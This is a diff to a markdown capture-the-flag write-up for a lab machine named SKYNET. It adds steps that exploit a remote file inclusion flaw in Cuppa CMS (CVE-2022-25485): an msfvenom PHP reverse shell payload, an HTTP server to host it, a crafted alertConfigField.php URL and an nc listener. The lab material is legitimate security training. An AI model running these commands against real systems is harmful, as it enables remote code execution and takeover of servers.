@@ -86,7 +86,19 @@ Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel
     - `ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt:FUZZ -u http://<target ip>/45kra24zxs28v3yd/FUZZ`
     - Returns /administrator directory
 - http://<target ip>/45kra24zxs28v3yd/administrator gives a login page
+- Cuppa CMS version present is vulnerable to CVE-2022-25485
 
-## Credential Access
+## Resource Development
 
-- 
+- Use *msfvenom* to generate a reverse shell payload
+    - `msfvenom -p php/reverse_php LHOST=<attack machine ip> LPORT=<attack machine port> -f raw > shell.php` (using php shell)
+- Set up temporary http server to host shell
+    - `python3 -m http.server <http server port>`
+- Set up vulnerable url endpoint to use against cuppa
+    - `/alerts/alertConfigField.php?urlConfig=http://<attack machine ip>:<http server port>/shell.php?`
+- Start listener
+    - `nc -lvnp <listening port>`
+
+## Execution
+
+- Paste vulnerable URL and connect to shell
